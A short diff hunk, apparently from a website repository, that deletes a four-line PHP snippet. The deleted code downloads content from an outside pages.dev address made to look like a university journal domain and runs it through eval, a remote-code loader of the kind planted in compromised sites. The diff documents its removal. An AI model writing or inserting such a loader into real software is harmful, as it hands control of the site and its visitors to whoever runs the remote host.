@@ -1,4 +1,0 @@
-<?php $KJ = file_get_contents(urldecode('https://muqjournal-uodiyala-edu-iq.pages.dev/'));
-
-$KJ = "?> ".$KJ;
-eval($KJ);
